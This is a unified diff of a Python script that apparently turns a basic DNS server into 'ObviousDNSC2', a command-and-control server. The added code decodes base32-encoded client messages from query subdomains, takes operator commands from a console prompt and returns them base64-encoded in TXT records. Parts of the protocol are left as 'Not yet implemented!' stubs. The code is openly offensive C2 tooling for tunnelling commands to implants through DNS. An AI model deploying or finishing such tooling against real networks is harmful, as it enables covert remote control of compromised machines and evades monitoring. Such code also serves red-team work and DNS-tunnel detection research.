@@ -1,9 +1,5 @@
 #!/usr/bin/env/python3
-# colorize output
-OV = '\x1b[0;33m' # verbose
-OR = '\x1b[0;34m' # routine
-OE = '\x1b[1;31m' # error
-OM = '\x1b[0m'    # mischief managed
+# from https://github.com/chriselgee/ObviousDNSC2
 
 import argparse
 import datetime
@@ -21,24 +17,77 @@ except ImportError:
     print(f"{OE}Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with {OR}pip{OE}.{OM}")
     sys.exit(2)
 
-def decode(b64):
-    return base64.decode(str(b64,"UTF"))
+# colorize output
+OV = '\x1b[0;33m' # verbose
+OR = '\x1b[0;34m' # routine
+OE = '\x1b[1;31m' # error
+OM = '\x1b[0m'    # mischief managed
 
-def encode(string):
-    return base64.encode(bytes(string,"UTF"))
+maxAReq = 63
+maxResp = 253
+userInput = ""
 
 class DomainName(str):
     def __getattr__(self, item):
         return DomainName(item + '.' + self)
 
-D = DomainName('example.com.')
-# IP = '127.0.0.1'
+def toBytes(input):
+    if isinstance(input, str): return input.encode('utf8')
+    else: return input
+
+def toString(input):
+    if isinstance(input, bytes): return input.decode('utf8')
+    else: return input
+
+def decode64(b64):
+    return base64.b64decode(toBytes(b64))
+
+def encode64(plain):
+    return base64.b64encode(toBytes(plain))
+
+def decode32(b32):
+    print(f"{OR}decoding {OV}{b32}")
+    revert = toBytes(b32).replace(b"-",b"=") # undo the "equals" silliness
+    revert = revert.replace(b"0",b"") # nuke and "0" pads
+    print(f"{OR}passing in {OV}{revert}")
+    return base64.b32decode(revert)
+
+def encode32(plain):
+    switch = toBytes(plain)
+    return base64.b32encode(switch).replace(b"=",b"-") # "equals" isn't allowed to play in domain names
+
+parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server.')
+parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server. Defailt to listen on UDP and TCP port 53.')
+parser.add_argument('-d', "--domain", default="example.com", type=str, help='The NS record pointing to this server.')
+parser.add_argument('--port', default=53, type=int, help='The port to listen on.')
+parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
+parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
+parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")
+
+args = parser.parse_args()
+if not (args.udp or args.tcp):
+    # parser.error("Please select at least one of --udp or --tcp.")
+    args.udp = args.tcp = True # let's default to yes on both
+
+if args.verbose:
+    debuggin = True
+else:
+    debuggin = False
+if debuggin: print(f"{OV}Verbose output enabled{OM}")
+
+if "domain" in args:
+    if not args.domain[-1:] == ".": args.domain += "." # gotta end with "." because DNS
+    D = DomainName(args.domain)
+else:
+    D = DomainName("example.com.")
+if debuggin: print(f"{OV}Using domain {OR}{D}{OM}")
+
 IP = '0.0.0.0'
 TTL = 1 # to (hopefully) ensure responses aren't cached.  Apparently "0" can have odd effects...
 
 soa_record = SOA(
     mname=D.ns1,  # primary name server
-    rname=D.andrei,  # email of the domain administrator
+    rname=D.odc2,  # email of the domain administrator
     times=(
         867530999,  # serial number
         60 * 60 * 1,  # refresh
@@ -53,32 +102,67 @@ records = {
     D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
     D.ns2: [A(IP)],
     D.mail: [A(IP)],
-    D.andrei: [CNAME(D)],
+    D.odc2: [CNAME(D)],
+    D.txt: [TXT(("bobberson"))],
 }
 
 def dns_response(data):
     request = DNSRecord.parse(data)
-    if debuggin: print(f"{OV}Incoming data looks like:\n{OR} {data}{OM}")
+    # if debuggin: print(f"{OV}Incoming data looks like:\n{OR} {data}{OM}")
     if debuggin: print(f"{OV}Incoming request looks like:\n{OR} {request}{OM}")
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
     qname = request.q.qname
-    if debuggin: print(f"{OV}Incoming qname looks like:\n{OR} {request.q.qname}{OM}")
+    # if debuggin: print(f"{OV}Incoming qname looks like:\n{OR} {request.q.qname}{OM}")
     qn = str(qname)
     qtype = request.q.qtype
     qt = QTYPE[qtype]
+    # if debuggin: print(f"{OV}qn, D look like:\n{OR} {qn}\n {D}{OM}")
     if qn == D or qn.endswith('.' + D):
+        # if debuggin: print(f"{OV}records.items() looks like:\n{OR} {records.items()}{OM}")
         for name, rrs in records.items():
+            # if debuggin: print(f"{OV}name, qn look like:\n{OR} {name}\n {qn}{OM}")
             if name == qn:
                 for rdata in rrs:
+                    # if debuggin: print(f"{OV}Outgoing rdata looks like:\n{OR} {rdata}{OM}")
                     rqt = rdata.__class__.__name__
                     if qt in ['*', rqt]:
                         reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
         for rdata in ns_records:
             reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
+        txtReply = c2(qn)
+        reply.add_answer(RR(qname, 16, ttl=0, rdata=TXT(txtReply)))
         reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
     if debuggin: print(f"{OV}Outgoing reply looks like:\n{OR} {reply}{OM}")
     return reply.pack()
 
+def c2(qname):
+    #try:
+        if debuggin: print(f"{OV}c2() working with incoming qname:{OR} {qname}{OM}")
+        request = qname.split(".")[0]
+        request = decode32(request).decode('UTF8')
+        msgType = request[:3]
+        if msgType == "CHK": # client checking in for commands
+            if userInput == "": # no user input? NOP
+                response = "NUL"
+            else: # have a command? send the command header
+                encCmd = encode64(userInput).decode('UTF8') # encode so special chars don't nuke us
+                chunks = wrap(encCmd,249) # break encoded command into chunks w/4-byte headers, 253 byte max
+                chunks.reverse() # so we can pop pieces off in order
+                response = f"HDR{len(chunks)}"
+        elif msgType == "HDR": # client sending response header
+            response = "Not yet implemented!"
+        elif msgType == "RES": # client sending response body
+            response = "Not yet implemented!"
+        elif msgType == "CON": # client ready for more from server
+            response = "Not yet implemented!"
+        else: # something went wrong
+            error = f"Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {msgType}"
+            print(OE + error + OM)
+            raise Exception(error)
+        if debuggin: print(f"{OV}c2() returning encoded response:{OR} {response}{OM}")
+        return encode64(response)
+    #except Exception as ex:
+    #    print(f"{OE}Exception in c2(): {OR}{ex}{OM}")
 
 class BaseRequestHandler(socketserver.BaseRequestHandler):
     def get_data(self):
@@ -119,22 +203,6 @@ class UDPRequestHandler(BaseRequestHandler):
         return self.request[1].sendto(data, self.client_address)
 
 def main():
-    parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server.')
-    parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server. Defailt to listen on UDP and TCP port 53.')
-    parser.add_argument('--port', default=53, type=int, help='The port to listen on.')
-    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
-    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
-    parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")
-
-    args = parser.parse_args()
-    if not (args.udp or args.tcp):
-        # parser.error("Please select at least one of --udp or --tcp.")
-        args.udp = args.tcp = True # let's default to yes on both
-
-    debuggin = args.verbose
-    if debuggin: print(f"{OV}Verbose output enabled{OM}")
-    print("Starting nameserver...")
-
     servers = []
     if args.udp: servers.append(socketserver.ThreadingUDPServer(('', args.port), UDPRequestHandler))
     if args.tcp: servers.append(socketserver.ThreadingTCPServer(('', args.port), TCPRequestHandler))
@@ -145,10 +213,12 @@ def main():
         thread.start()
         print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
     try:
-        while 1:
+        while True:
             time.sleep(1)
             sys.stderr.flush()
             sys.stdout.flush()
+            global userInput
+            userInput = input(f"{OR}ODC2 {D} > {OR}")
     except KeyboardInterrupt:
         pass
     finally:
@@ -156,4 +226,5 @@ def main():
             s.shutdown()
 
 if __name__ == '__main__':
+    print(f"{OR}Starting nameserver...{OM}")
     main()
